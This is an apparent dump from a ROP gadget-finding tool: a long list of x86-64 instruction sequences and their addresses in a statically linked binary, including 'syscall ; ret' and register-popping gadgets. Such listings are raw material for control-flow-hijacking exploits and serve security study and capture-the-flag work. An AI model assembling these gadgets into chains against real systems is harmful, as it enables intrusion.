0x0000000000492c6a : add al, 0x84 ; add rax, r12 ; jmp rax
0x000000000046d829 : add al, 0x84 ; ror byte ptr [rdi], 0x84 ; ret 0x17
0x000000000047afb9 : add al, 0x85 ; sal byte ptr [rbp - 0xe], cl ; ret
0x000000000049356b : add al, 0x86 ; add rax, r14 ; jmp rax
0x000000000047557c : add al, 0x86 ; add rax, rsi ; jmp rax
0x00000000004b33dc : add al, 0x86 ; cmc ; call rsp
0x0000000000491c19 : add al, 0x87 ; add rax, r15 ; jmp rax
0x0000000000475d18 : add al, 0x87 ; add rax, rdi ; jmp rax
0x000000000044a7a6 : add al, 0x88 ; add al, 0x48 ; lea eax, dword ptr [rdx + 4] ; ret
0x0000000000448fe6 : add al, 0x88 ; add al, 0x48 ; mov eax, edi ; ret
0x00000000004919f3 : add al, 0x88 ; add rax, r8 ; jmp rax
0x000000000044f1bb : add al, 0x8a ; je 0x44f1a5 ; ret
0x000000000044ec43 : add al, 0x96 ; add rax, rsi ; jmp rax
0x00000000004931a3 : add al, 0x99 ; add rax, r9 ; jmp rax
0x000000000044fd05 : add al, 0x9a ; add rax, rdx ; jmp rax
0x0000000000482cff : add al, 0xa1 ; add rax, rcx ; jmp rax
0x0000000000483627 : add al, 0xa7 ; add rax, rdi ; jmp rax
0x000000000044eb89 : add al, 0xbe ; add rax, rsi ; jmp rax
0x00000000004728fd : add al, 0xc6 ; jmp rax
0x0000000000467ac2 : add al, 0xc6 ; mov esi, 1 ; jmp rax
0x000000000046811a : add al, 0xc6 ; xor esi, esi ; jmp rax
0x0000000000467a78 : add al, 0xc7 ; jmp rax
0x0000000000472938 : add al, 0xc8 ; mov ecx, 1 ; jmp rax
0x000000000048afbd : add al, 0xde ; lea r9, qword ptr [rdx] ; jmp 0x48b019
0x000000000048eddd : add al, 0xde ; lea r9, qword ptr [rdx] ; jmp 0x48ee39
0x000000000045fdc1 : add al, 0xe8 ; test rax, rax ; je 0x45fdd1 ; call rax
0x000000000048b888 : add al, 0xf ; mov dh, 0xc0 ; pop rbx ; pop rbp ; pop r12 ; ret
0x0000000000430d46 : add al, 0xf ; movzx edx, byte ptr [rsi + rcx] ; sub eax, edx ; ret
0x000000000044d69b : add al, 0xf ; sub rax, rsi ; ret
0x000000000043c213 : add al, 0xf3 ; movq qword ptr [rdi], mm1 ; ret
0x000000000045037b : add al, 0xf3 ; ret
0x000000000046752e : add al, 0xf8 ; jmp rax
0x0000000000415917 : add al, 1 ; add byte ptr [rax], al ; add byte ptr [rax - 0x7d], cl ; ret
0x00000000004166db : add al, 1 ; add byte ptr [rcx + 0x415d5be8], cl ; pop rsp ; ret
0x0000000000433fe7 : add al, 3 ; add byte ptr [rax], al ; xor eax, eax ; ret
0x0000000000446c0d : add al, 7 ; cmp byte ptr [rax], sil ; cmovne rax, rdx ; ret
0x00000000004728f9 : add al, 7 ; mov rax, qword ptr [rsi + rax*8] ; jmp rax
0x0000000000446e28 : add al, 7 ; ret
0x000000000042c8cf : add al, 8 ; movzx edx, byte ptr [rdx + rcx] ; sub eax, edx ; ret
0x00000000004b7c9f : add al, ah ; lodsd eax, dword ptr [rsi] ; stc ; call qword ptr [rax]
0x00000000004b6d6f : add al, ah ; out 0xf8, eax ; call qword ptr [rax]
0x0000000000405d47 : add al, ah ; ret
0x00000000004ba3bb : add al, al ; jns 0x4ba3c7 ; add byte ptr [rax - 0x10], dh ; sti ; jmp qword ptr [rbx]
0x00000000004a6387 : add al, al ; sldt word ptr [rax] ; ret
0x000000000044ecd5 : add al, bh ; jg 0x44ecd7 ; int1 ; mov eax, eax ; ret
0x00000000004b33c7 : add al, bh ; test ebp, esi ; call qword ptr [rdx]
0x00000000004b7cb7 : add al, bl ; lodsd eax, dword ptr [rsi] ; stc ; call qword ptr [rdx]
0x000000000049b680 : add al, bl ; stc ; call rax
0x0000000000496cb6 : add al, bpl ; ret
0x0000000000447801 : add al, byte ptr [rax + rax*8 - 0xb7ed8c] ; ret 0x2288
0x000000000040799b : add al, byte ptr [rax] ; add bh, bh ; push rbx ; adc byte ptr [rax - 0x7d], cl ; ret
0x000000000045be0d : add al, byte ptr [rax] ; add byte ptr [rax + 0x39], cl ; ret
0x0000000000481b60 : add al, byte ptr [rax] ; add byte ptr [rax + 0x39], cl ; ret 0xed75
0x00000000004663b3 : add al, byte ptr [rax] ; add byte ptr [rax + 0x63], cl ; ret
0x0000000000431c42 : add al, byte ptr [rax] ; add byte ptr [rax + 1], cl ; clc ; add rax, rcx ; ret
0x000000000048ecbe : add al, byte ptr [rax] ; add byte ptr [rax + 1], cl ; ret 0x3a83
0x000000000046187d : add al, byte ptr [rax] ; add byte ptr [rax + rcx*2 - 0x77], ah ; adc dword ptr [rax - 0x39], ecx ; ret 0xffe0
0x0000000000407985 : add al, byte ptr [rax] ; add byte ptr [rax - 0x39], cl ; ret
0x000000000046f6f4 : add al, byte ptr [rax] ; add byte ptr [rax - 0x39], cl ; ret 0x2c20
0x0000000000429e83 : add al, byte ptr [rax] ; add byte ptr [rax - 0x39], cl ; ret 0xffdf
0x0000000000482eda : add al, byte ptr [rax] ; add byte ptr [rax - 0x75], cl ; adc byte ptr [r8 - 0x7d], cl ; ret
0x000000000047f015 : add al, byte ptr [rax] ; add byte ptr [rax - 0x77], cl ; ret 0x8348
0x000000000044e1c4 : add al, byte ptr [rax] ; add byte ptr [rax - 0x77], cl ; sal ebx, 1 ; movsb byte ptr [rdi], byte ptr [rsi] ; ret
0x000000000042818a : add al, byte ptr [rax] ; add byte ptr [rax - 0x7d], cl ; call qword ptr [rax]
0x000000000045b5ab : add al, byte ptr [rax] ; add byte ptr [rax - 0x7d], cl ; ret 0x4801
0x0000000000431917 : add al, byte ptr [rax] ; add byte ptr [rax - 0x7d], cl ; ret 0x4910
0x00000000004452b1 : add al, byte ptr [rax] ; add byte ptr [rax - 0x7d], cl ; ret 0xe910
0x0000000000431945 : add al, byte ptr [rax] ; add byte ptr [rax - 0x7d], cl ; ret 0xeb10
0x0000000000461772 : add al, byte ptr [rax] ; add byte ptr [rax - 0x7f], cl ; ret 0x200
0x00000000004847d6 : add al, byte ptr [rax] ; add byte ptr [rax], al ; add byte ptr [rax - 0x7d], cl ; ret 0x4810
0x0000000000451159 : add al, byte ptr [rax] ; add byte ptr [rax], al ; jmp rax
0x000000000047b274 : add al, byte ptr [rax] ; add byte ptr [rax], al ; ret
0x00000000004227a8 : add al, byte ptr [rax] ; add byte ptr [rbp + rcx*4 + 5], cl ; ret 0x778
0x000000000044cc44 : add al, byte ptr [rax] ; add byte ptr [rbx - 0x7bf0ed07], al ; ret 2
0x0000000000417666 : add al, byte ptr [rax] ; add byte ptr [rbx - 0x7bf0fd08], al ; ret
0x000000000048c5c4 : add al, byte ptr [rax] ; add byte ptr [rcx + 0xc8b48d8], cl ; ret 0xb60f
0x0000000000421856 : add al, byte ptr [rax] ; add dh, dh ; ret
0x000000000042ae83 : add al, byte ptr [rax] ; cmove rax, rdx ; ret
0x000000000042a26c : add al, byte ptr [rax] ; cmovne rax, rdx ; ret
0x00000000004919c2 : add al, byte ptr [rax] ; movss dword ptr [rsp - 0x28], xmm0 ; ret
0x0000000000482cfb : add al, byte ptr [rax] ; movsxd rax, dword ptr [rcx + r12*4] ; add rax, rcx ; jmp rax
0x0000000000483623 : add al, byte ptr [rax] ; movsxd rax, dword ptr [rdi + r12*4] ; add rax, rdi ; jmp rax
0x000000000048ba0a : add al, byte ptr [rax] ; movsxd rax, dword ptr [rdx + rax*4] ; add rax, rdx ; jmp rax
0x0000000000453ffa : add al, byte ptr [rax] ; xor edx, edx ; cmp ebx, eax ; setne dl ; jmp 0x453fee
0x0000000000451a35 : add al, byte ptr [rbx + 0x94801e0] ; ret 0x8949
0x000000000045288e : add al, byte ptr [rcx + 0x39] ; ret
0x000000000049b274 : add al, byte ptr [rdi - 0x782d0007] ; stc ; call rdx
0x00000000004b377d : add al, byte ptr [rdx] ; ret 0xb00e
0x000000000042b251 : add al, byte ptr cs:[rax] ; cmovne rax, rdx ; ret
0x000000000042b03d : add al, byte ptr ss:[rax] ; cmovne rax, rdx ; ret
0x0000000000459149 : add al, ch ; adc ebx, esi ; cli ; inc dword ptr [rcx - 0x77] ; ret
0x00000000004b90e3 : add al, ch ; add byte ptr [rax], al ; sub cl, ch ; std ; call rdx
0x000000000042572b : add al, ch ; call rax
0x00000000004ba557 : add al, ch ; clc ; sti ; jmp rdx
0x000000000047117d : add al, ch ; lea esp, dword ptr [rax] ; add byte ptr [rax + 0x39], cl ; ret
0x00000000004b8f37 : add al, ch ; mov dl, bh ; call qword ptr [rcx]
0x000000000044fcce : add al, ch ; pushfq ; cmp dword ptr [rcx], eax ; add byte ptr [rax - 0x77], cl ; ret 0x8b48
0x0000000000416467 : add al, ch ; ret
0x0000000000427c68 : add al, ch ; ret 0x2ab
0x0000000000424e68 : add al, ch ; ret 0x2d9
0x0000000000415268 : add al, ch ; ret 0x3d5
0x000000000045bb98 : add al, ch ; ret 0xfac8
0x000000000048c938 : add al, ch ; ret 0xffc7
0x00000000004165f6 : add al, ch ; ret 3
0x000000000045c431 : add al, ch ; sub eax, eax ; cli ; inc dword ptr [rcx - 0x77] ; ret 0x5be9
0x00000000004b7117 : add al, cl ; jbe 0x4b7118 ; call qword ptr [rdx]
0x00000000004b8ef7 : add al, cl ; mov dl, bh ; call qword ptr [rdi]
0x00000000004b33c3 : add al, cl ; or dword ptr [rax], eax ; add al, bh ; test ebp, esi ; call qword ptr [rdx]
0x00000000004bd4e7 : add al, cl ; xchg eax, esp ; std ; jmp qword ptr [rax]
0x000000000049c2f0 : add al, dh ; cli ; call qword ptr [rax]
0x00000000004b713f : add al, dh ; jbe 0x4b7140 ; call qword ptr [rbx]
0x00000000004b70ef : add al, dh ; jne 0x4b70f0 ; call qword ptr [rax]
0x00000000004bcf7f : add al, dl ; js 0x4bcf84 ; call qword ptr [rbx]
0x00000000004b8f0f : add al, dl ; mov dl, bh ; call qword ptr [rcx]
0x00000000004ba5b9 : add bh, ah ; jmp qword ptr [rbx]
0x00000000004bb6fe : add bh, ah ; ret
0x000000000045544f : add bh, al ; add dword ptr [rax], eax ; add byte ptr [rax], al ; add byte ptr [rax - 0x7d], cl ; ret 0x4801
0x0000000000465707 : add bh, al ; test dword ptr [rax], ecx ; idiv edi ; call qword ptr [rax]
0x00000000004153ef : add bh, bh ; adc ecx, dword ptr [rax - 0x7d] ; ret
0x000000000040799d : add bh, bh ; push rbx ; adc byte ptr [rax - 0x7d], cl ; ret
0x000000000048c48f : add bh, bh ; ror dword ptr [rax - 0x77], cl ; ret
0x000000000048b0f9 : add bh, byte ptr [rax + 1] ; ret
0x000000000048b256 : add bh, byte ptr [rax + 2] ; ret
0x000000000045009b : add bh, byte ptr [rax - 1] ; ret
0x000000000044d012 : add bh, byte ptr [rcx] ; enter -0x3fe7, -0x7d ; fdivr st(7) ; ret
0x000000000040776a : add bh, dh ; ret 0
0x0000000000459e09 : add bh, dh ; ret 0xf800
0x0000000000415a2f : add bh, dh ; ret 0xffef
0x000000000049bb19 : add bh, dl ; call rax
0x000000000049ba99 : add bh, dl ; jmp rsp
0x000000000049ba95 : add bh, dl ; push qword ptr [rdx + rax - 6] ; jmp rsp
0x000000000047b271 : add bl, al ; mov eax, 2 ; ret
0x000000000048ecda : add bl, al ; nop dword ptr [rax] ; xor eax, eax ; ret
0x000000000046a279 : add bl, bl ; sub bl, cl ; in eax, 0xdf ; loopne 0x46a212 ; ret
0x0000000000490beb : add bl, ch ; add eax, 0x1489066 ; ret 0xb70f
0x0000000000400c5b : add bl, ch ; add eax, 0x1b8 ; add cl, cl ; ret
0x000000000049c298 : add bl, ch ; cli ; call qword ptr [rax]
0x000000000048c759 : add bl, ch ; ret
0x0000000000415cc8 : add bl, ch ; ret 0x1f0f
0x00000000004919c3 : add bl, dh ; movups xmmword ptr [rsp - 0x28], xmm0 ; ret
0x0000000000400a9f : add bl, dh ; ret
0x0000000000421b4e : add bl, sil ; ret
0x00000000004b8f1f : add byte ptr [0xffffffff88dc0000], ah ; cli ; call qword ptr [rcx]
0x00000000004881e0 : add byte ptr [r8 + 9], r9b ; ret 0x840f
0x00000000004794a6 : add byte ptr [r8 - 0x77], r9b ; fcomp dword ptr [rbx + 0x5d] ; pop r12 ; ret
0x000000000045bfb5 : add byte ptr [r8 - 0x77], r9b ; fimul dword ptr [rax + 0x29] ; ret 0x8348
0x0000000000401329 : add byte ptr [r8 - 0x7d], r9b ; ret
0x00000000004b6d09 : add byte ptr [r8], al ; adc al, 0x89 ; clc ; jmp qword ptr [rsi]
0x00000000004b7555 : add byte ptr [r8], al ; cwde ; mov bh, cl ; jmp qword ptr [rcx]
0x00000000004b6d6d : add byte ptr [r8], al ; loopne 0x4b6d5f ; clc ; call qword ptr [rax]
0x00000000004b7101 : add byte ptr [r8], r8b ; in al, dx ; jne 0x4b7106 ; jmp rbx
0x00000000004b7901 : add byte ptr [r8], r8b ; pop rsp ; cdq ; stc ; call rsi
0x00000000004b718d : add byte ptr [r8], r8b ; xor byte ptr [rax - 7], bh ; call qword ptr [rbx]
0x00000000004b999b : add byte ptr [rax + 0x1000006f], ah ; ret
0x0000000000429f7f : add byte ptr [rax + 0x16], bh ; ret
0x00000000004b4163 : add byte ptr [rax + 0x17], ch ; add byte ptr [rax], al ; cwde ; ret
0x0000000000418c80 : add byte ptr [rax + 0x29], cl ; ret
0x0000000000459591 : add byte ptr [rax + 0x29], cl ; ret 0x349
0x000000000045a0f7 : add byte ptr [rax + 0x29], cl ; ret 0x8348
0x000000000046ca38 : add byte ptr [rax + 0x29], cl ; ret 0x8349
0x000000000040128c : add byte ptr [rax + 0x29], cl ; ret 0x8948
0x00000000004814ea : add byte ptr [rax + 0x29], cl ; ret 0x8d48
0x0000000000401454 : add byte ptr [rax + 0x29], cl ; ret 0xf74
0x00000000004b718b : add byte ptr [rax + 0x30000047], dl ; js 0x4b7194 ; call qword ptr [rbx]
0x000000000042a100 : add byte ptr [rax + 0x31], dl ; shr al, 0x17 ; ret 0xfffe
0x0000000000429f5f : add byte ptr [rax + 0x31], dl ; shr al, 0xb8 ; ret
0x00000000004b5c3b : add byte ptr [rax + 0x32], al ; add byte ptr [rax], al ; sal cl, 0xf6 ; jmp rsi
0x00000000004b6e83 : add byte ptr [rax + 0x38000044], cl ; cmp bh, cl ; jmp qword ptr [rbx]
0x00000000004153cf : add byte ptr [rax + 0x39], cl ; ret
0x0000000000491bc3 : add byte ptr [rax + 0x39], cl ; ret 0x830f
0x0000000000420b5f : add byte ptr [rax + 0x39], cl ; ret 0x840f
0x0000000000419c5f : add byte ptr [rax + 0x39], cl ; ret 0x850f
0x0000000000491c58 : add byte ptr [rax + 0x39], cl ; ret 0x9272
0x0000000000481b62 : add byte ptr [rax + 0x39], cl ; ret 0xed75
0x0000000000423a20 : add byte ptr [rax + 0x39], cl ; ret 0xf275
0x000000000047eebe : add byte ptr [rax + 0x39], cl ; ret 0xf48
0x00000000004b357b : add byte ptr [rax + 0x4000000b], al ; xchg eax, esp ; cmc ; jmp qword ptr [rax]
0x00000000004b6a4b : add byte ptr [rax + 0x40], dl ; add byte ptr [rax], al ; xor byte ptr [rax - 9], cl ; jmp qword ptr [rbx]
0x00000000004b6d6b : add byte ptr [rax + 0x43], dh ; add byte ptr [rax], al ; loopne 0x4b6d61 ; clc ; call qword ptr [rax]
0x00000000004b7553 : add byte ptr [rax + 0x4b], bl ; add byte ptr [rax], al ; cwde ; mov bh, cl ; jmp qword ptr [rcx]
0x00000000004b786b : add byte ptr [rax + 0x4e], dh ; add byte ptr [rax], al ; cwde ; stc ; jmp qword ptr [rcx]
0x00000000004b7883 : add byte ptr [rax + 0x5800004e], cl ; cwde ; stc ; jmp qword ptr [rcx]
0x00000000004b8443 : add byte ptr [rax + 0x5a], cl ; add byte ptr [rax], al ; pop rax ; stc ; call qword ptr [rax]
0x0000000000413bdd : add byte ptr [rax + 0x63], cl ; adc al, 0x97 ; add rdx, rdi ; jmp rdx
0x00000000004756e5 : add byte ptr [rax + 0x63], cl ; add al, 0x81 ; add rax, rcx ; jmp rax
0x00000000004088b4 : add byte ptr [rax + 0x63], cl ; add al, 0x82 ; add rax, rdx ; jmp rax
0x0000000000475d15 : add byte ptr [rax + 0x63], cl ; add al, 0x87 ; add rax, rdi ; jmp rax
0x000000000044fd02 : add byte ptr [rax + 0x63], cl ; add al, 0x9a ; add rax, rdx ; jmp rax
0x000000000044eb86 : add byte ptr [rax + 0x63], cl ; add al, 0xbe ; add rax, rsi ; jmp rax
0x0000000000460317 : add byte ptr [rax + 0x63], cl ; ret
0x0000000000493693 : add byte ptr [rax + 0x63], cl ; ret 0xbc80
0x00000000004761e3 : add byte ptr [rax + 0x63], cl ; ror dword ptr [rax - 0x75], 4 ; ret 0x8548
0x0000000000464831 : add byte ptr [rax + 0x63], cl ; ror dword ptr [rax - 0x7d], cl ; ret 0x4820
0x000000000047c17f : add byte ptr [rax + 0x66], bh ; syscall ; ret
0x00000000004bc083 : add byte ptr [rax + 0x68000096], cl ; stc ; cld ; jmp rdx
0x000000000047c19f : add byte ptr [rax + 0x68], bh ; syscall ; ret
0x000000000047c18f : add byte ptr [rax + 0x6b], bh ; syscall ; ret
0x000000000047c1af : add byte ptr [rax + 0x6c], bh ; syscall ; ret
0x0000000000490403 : add byte ptr [rax + 0x74], ah ; adc dword ptr [rcx - 0x7d], ecx ; ret
0x00000000004477ff : add byte ptr [rax + 0x74c08402], cl ; adc cl, byte ptr [rax - 1] ; ret 0x2288
0x000000000044b23f : add byte ptr [rax + 0x78d4837], cl ; ret
0x00000000004ba553 : add byte ptr [rax + 0x7b], bl ; add byte ptr [rax], al ; call 0xffffffffe34ba15d
0x00000000004b7bb3 : add byte ptr [rax + 0x8000051], bh ; lodsb al, byte ptr [rsi] ; stc ; jmp qword ptr [rcx]
0x0000000000453bdb : add byte ptr [rax + 0xf480004], bl ; ret
0x000000000042b1a9 : add byte ptr [rax + 0xf4802e5], al ; ret 0xc3f3
0x000000000044ec57 : add byte ptr [rax + 0xf48f0e5], al ; ret 0xc35b
0x000000000041bfdf : add byte ptr [rax + 0xf], al ; mov dh, 0xc5 ; pop rbx ; pop rbp ; pop r12 ; ret
0x0000000000479e95 : add byte ptr [rax + 0xf], cl ; mov ebp, 0xf80148c0 ; ret
0x000000000045682f : add byte ptr [rax + 0xf], cl ; mov esi, 0x83480147 ; ret
0x00000000004237d4 : add byte ptr [rax + 0xf], cl ; ret
0x0000000000481cf6 : add byte ptr [rax + 0xf], cl ; ret 0x3e80
0x000000000042a2f4 : add byte ptr [rax + 0xf], cl ; ret 0x66c3
0x000000000041998a : add byte ptr [rax + 0xf], cl ; ret 0x8948
0x0000000000424883 : add byte ptr [rax + 0xf], cl ; ret 0x894c
0x0000000000481d45 : add byte ptr [rax + 0xf], cl ; ret 0x8b48
0x000000000044ebca : add byte ptr [rax + 0xf], cl ; ret 0xc35b
0x000000000042a26d : add byte ptr [rax + 0xf], cl ; ret 0xc3f3
0x000000000042af6d : add byte ptr [rax + 0xf], cl ; ret 0xfc3
0x000000000045ac28 : add byte ptr [rax + 0xf], cl ; ret 0xff85
0x00000000004011e7 : add byte ptr [rax + 1], bh ; ret
0x0000000000431c44 : add byte ptr [rax + 1], cl ; clc ; add rax, rcx ; ret
0x0000000000417c02 : add byte ptr [rax + 1], cl ; ret
0x000000000048a2c8 : add byte ptr [rax + 1], cl ; ret 0x149
0x000000000048ecc0 : add byte ptr [rax + 1], cl ; ret 0x3a83
0x000000000048b2c5 : add byte ptr [rax + 2], bh ; ret
0x00000000004b2c43 : add byte ptr [rax + 2], cl ; add byte ptr [rax], al ; fsubr st(1) ; hlt ; jmp rdi
0x00000000004ba73f : add byte ptr [rax + 8], ah ; cld ; jmp qword ptr [rax]
0x00000000004881e1 : add byte ptr [rax + 9], cl ; ret 0x840f
0x000000000047cda0 : add byte ptr [rax + 9], cl ; ret 0x850f
0x00000000004a532b : add byte ptr [rax + rax + 0xbf0000], bh ; add byte ptr [rax], al ; ret 0
0x0000000000457083 : add byte ptr [rax + rax*8 - 0x76b3178b], al ; ret 0x294c
0x00000000004791ff : add byte ptr [rax + rax], al ; add byte ptr [rbx + 0x5d], bl ; pop r12 ; ret
0x000000000042aed4 : add byte ptr [rax + rax], al ; add byte ptr [rsi - 9], dh ; ret 0
0x000000000042472b : add byte ptr [rax + rax], cl ; add byte ptr [rax], al ; mov rax, rsi ; ret
0x000000000047a8a7 : add byte ptr [rax + rax], cl ; add byte ptr [rbx + rax - 0xd], dh ; ret
0x00000000004b9237 : add byte ptr [rax + rbp*2], bh ; add byte ptr [rax], al ; xor al, 0xa4 ; cli ; call qword ptr [rdx]
0x000000000046178d : add byte ptr [rax + rcx - 0xd], dh ; ret
0x000000000046187f : add byte ptr [rax + rcx*2 - 0x77], ah ; adc dword ptr [rax - 0x39], ecx ; ret 0xffe0
0x00000000004a64d7 : add byte ptr [rax + rdx + 0x10bf0000], bh ; add byte ptr [rax], al ; ret 0x10
0x00000000004ba3a7 : add byte ptr [rax - 0x10], bl ; sti ; jmp qword ptr [rbx]
0x00000000004ba3bf : add byte ptr [rax - 0x10], dh ; sti ; jmp qword ptr [rbx]
0x00000000004825b4 : add byte ptr [rax - 0x168b7f80], 0x89 ; ret 0xeac1
0x0000000000423c3f : add byte ptr [rax - 0x17], dl ; ret
0x00000000004b7c9b : add byte ptr [rax - 0x1fffffae], ah ; lodsd eax, dword ptr [rsi] ; stc ; call qword ptr [rax]
0x00000000004b7cb3 : add byte ptr [rax - 0x27ffffae], bh ; lodsd eax, dword ptr [rsi] ; stc ; call qword ptr [rdx]
0x00000000004bcf7b : add byte ptr [rax - 0x2fffff5b], al ; js 0x4bcf88 ; call qword ptr [rbx]
0x00000000004b6d47 : add byte ptr [rax - 0x34], bl ; clc ; call qword ptr [rax]
0x0000000000407987 : add byte ptr [rax - 0x39], cl ; ret
0x0000000000416673 : add byte ptr [rax - 0x39], cl ; ret 0x2c20
0x000000000046bddb : add byte ptr [rax - 0x39], cl ; ret 0x32c8
0x00000000004640bf : add byte ptr [rax - 0x39], cl ; ret 0xffa0
0x0000000000414567 : add byte ptr [rax - 0x39], cl ; ret 0xffc0
0x0000000000429e85 : add byte ptr [rax - 0x39], cl ; ret 0xffdf
0x000000000046ed65 : add byte ptr [rax - 0x39], cl ; ret 0xffe0
0x000000000047b4cf : add byte ptr [rax - 0x39], cl ; rol byte ptr [rbx], 0 ; add byte ptr [rax], al ; ret
0x000000000047b4af : add byte ptr [rax - 0x39], cl ; rol byte ptr [rcx], 0 ; add byte ptr [rax], al ; ret
0x000000000047b50f : add byte ptr [rax - 0x39], cl ; rol byte ptr [rdi], 0 ; add byte ptr [rax], al ; ret
0x000000000047b4bf : add byte ptr [rax - 0x39], cl ; rol byte ptr [rdx], 0 ; add byte ptr [rax], al ; ret
0x000000000047b4ff : add byte ptr [rax - 0x39], cl ; rol byte ptr [rsi], 0 ; add byte ptr [rax], al ; ret
0x000000000045f4d9 : add byte ptr [rax - 0x3f], cl ; ret 0x4811
0x000000000045f4b0 : add byte ptr [rax - 0x3f], cl ; ret 0x6411
0x000000000045ee10 : add byte ptr [rax - 0x3f], cl ; ret 0x8511
0x00000000004b6893 : add byte ptr [rax - 0x47ffffc2], bl ; cmp dh, bh ; jmp qword ptr [rbx]
0x00000000004681bf : add byte ptr [rax - 0x4f743], al ; jmp qword ptr [rax]
0x00000000004bc753 : add byte ptr [rax - 0x63], bl ; add byte ptr [rax], al ; sub byte ptr [rdx], ch ; std ; jmp qword ptr [rcx]
0x00000000004b786f : add byte ptr [rax - 0x68], al ; stc ; jmp qword ptr [rcx]
0x00000000004b7887 : add byte ptr [rax - 0x68], bl ; stc ; jmp qword ptr [rcx]
0x00000000004bc06b : add byte ptr [rax - 0x6a], dh ; add byte ptr [rax], al ; push rax ; stc ; cld ; jmp qword ptr [rdx]
0x00000000004b357f : add byte ptr [rax - 0x6c], al ; cmc ; jmp qword ptr [rax]
0x00000000004bbd3b : add byte ptr [rax - 0x6d], al ; add byte ptr [rax], al ; rcr ch, 1 ; cld ; jmp qword ptr [rcx]
0x000000000045bdaa : add byte ptr [rax - 0x73], cl ; add cl, byte ptr [rax + 0x39] ; ret
0x000000000045df2d : add byte ptr [rax - 0x73], cl ; add dword ptr [rax + 0x39], r9d ; ret
0x0000000000453faf : add byte ptr [rax - 0x73], cl ; add eax, 0x26e349 ; ret
0x000000000045df4b : add byte ptr [rax - 0x73], cl ; add r9b, byte ptr [rax + 0x39] ; ret
0x000000000045df69 : add byte ptr [rax - 0x73], cl ; add r9d, dword ptr [rax + 0x39] ; ret
0x000000000047eb66 : add byte ptr [rax - 0x73], cl ; dec dword ptr [rax - 0x7d] ; ret
0x0000000000422eba : add byte ptr [rax - 0x73], cl ; push rax ; adc dh, dh ; ret 0xf0f
0x00000000004254cf : add byte ptr [rax - 0x73], cl ; push rcx ; adc byte ptr [rax + 0x39], cl ; ret 0x1f77
0x0000000000421808 : add byte ptr [rax - 0x73], cl ; push rcx ; adc byte ptr [rax + 0x39], cl ; ret 0x870f
0x00000000004883db : add byte ptr [rax - 0x73], cl ; ret 0xeb30
0x00000000004723db : add byte ptr [rax - 0x73], cl ; xor eax, 0x24ca3d ; jmp rax
0x0000000000482edc : add byte ptr [rax - 0x75], cl ; adc byte ptr [r8 - 0x7d], cl ; ret
0x00000000004202ff : add byte ptr [rax - 0x75], cl ; adc byte ptr [rax - 0x7d], cl ; ret 0x4801
0x000000000048ca97 : add byte ptr [rax - 0x75], cl ; adc cl, byte ptr [rcx + 0x48b48d8] ; ret 0x8b48
0x00000000004915c8 : add byte ptr [rax - 0x75], cl ; add al, 0x24 ; add rsp, 0x38 ; ret
0x0000000000468117 : add byte ptr [rax - 0x75], cl ; add al, 0xc6 ; xor esi, esi ; jmp rax
0x0000000000467a75 : add byte ptr [rax - 0x75], cl ; add al, 0xc7 ; jmp rax
0x000000000046752b : add byte ptr [rax - 0x75], cl ; add al, 0xf8 ; jmp rax
0x000000000045e62f : add byte ptr [rax - 0x75], cl ; add eax, 0x265881 ; ret
0x00000000004560cf : add byte ptr [rax - 0x75], cl ; add eax, 0x26ebd1 ; ret
0x000000000041f12f : add byte ptr [rax - 0x75], cl ; add eax, 0x2a1fe9 ; ret
0x000000000041488b : add byte ptr [rax - 0x75], cl ; and al, 8 ; call rax
0x000000000045550f : add byte ptr [rax - 0x75], cl ; cmp ecx, dword ptr [rax - 0x7d] ; ret
0x000000000042935f : add byte ptr [rax - 0x75], cl ; je 0x429391 ; sub byte ptr [rax - 0x77], cl ; out dx, eax ; call rax
0x000000000046221b : add byte ptr [rax - 0x75], cl ; jl 0x46224c ; or byte ptr [rax - 0x7d], cl ; call qword ptr [rbx]
0x0000000000415322 : add byte ptr [rax - 0x75], cl ; js 0x41534c ; call rdx
0x0000000000478aff : add byte ptr [rax - 0x75], cl ; mov rax, qword ptr [rax + 0x4c] ; ret
0x000000000048d7e0 : add byte ptr [rax - 0x75], cl ; pop rbp ; mov eax, 0x89fd8945 ; ret 0xe283
0x000000000040784d : add byte ptr [rax - 0x75], cl ; push rax ; and byte ptr [rax + 1], cl ; ret 0xb70f
0x0000000000435dcf : add byte ptr [rax - 0x75], cl ; push rsi ; clc ; mov qword ptr [rdi - 8], rdx ; ret
0x0000000000418d9f : add byte ptr [rax - 0x76b80000], al ; ret
0x000000000040168a : add byte ptr [rax - 0x76beac8e], al ; ret 0x1b8
0x000000000048b556 : add byte ptr [rax - 0x77], cl ; add eax, 0x238b4a ; ret
0x00000000004201ca : add byte ptr [rax - 0x77], cl ; add eax, 0x2a168e ; ret
0x000000000041fcc5 : add byte ptr [rax - 0x77], cl ; add eax, 0x2a1b23 ; ret
0x000000000041fc9d : add byte ptr [rax - 0x77], cl ; add eax, 0x2a1b43 ; ret
0x000000000041fc7d : add byte ptr [rax - 0x77], cl ; add eax, 0x2a1b5b ; ret
0x0000000000419422 : add byte ptr [rax - 0x77], cl ; clc ; ret
0x000000000041b183 : add byte ptr [rax - 0x77], cl ; fcomp dword ptr [rbx + 0x5d] ; pop r12 ; ret
0x000000000045bfb6 : add byte ptr [rax - 0x77], cl ; fimul dword ptr [rax + 0x29] ; ret 0x8348
0x0000000000478c54 : add byte ptr [rax - 0x77], cl ; fucompi st(0) ; ret
0x000000000049206e : add byte ptr [rax - 0x77], cl ; fucompi st(1) ; ret
0x000000000041ed1b : add byte ptr [rax - 0x77], cl ; imul esp, dword ptr [rax + 0x5b], 0x5d ; pop r12 ; ret
0x0000000000452c1f : add byte ptr [rax - 0x77], cl ; jo 0x452c49 ; ret
0x0000000000419573 : add byte ptr [rax - 0x77], cl ; mov edx, 0x130 ; pop rbx ; ret
0x0000000000429fdf : add byte ptr [rax - 0x77], cl ; out dx, al ; mov rdi, rax ; call rcx
0x000000000040a1bf : add byte ptr [rax - 0x77], cl ; ret
0x000000000044fefb : add byte ptr [rax - 0x77], cl ; ret 0x16e9
0x00000000004246d7 : add byte ptr [rax - 0x77], cl ; ret 0x2948
0x0000000000417cd6 : add byte ptr [rax - 0x77], cl ; ret 0x294c
0x0000000000419baa : add byte ptr [rax - 0x77], cl ; ret 0x294d
0x000000000049543c : add byte ptr [rax - 0x77], cl ; ret 0x3948
0x000000000044ffa7 : add byte ptr [rax - 0x77], cl ; ret 0x6ae9
0x000000000040972e : add byte ptr [rax - 0x77], cl ; ret 0x7ce9
0x00000000004668e8 : add byte ptr [rax - 0x77], cl ; ret 0x8148
0x000000000042198c : add byte ptr [rax - 0x77], cl ; ret 0x8348
0x00000000004094af : add byte ptr [rax - 0x77], cl ; ret 0x8548
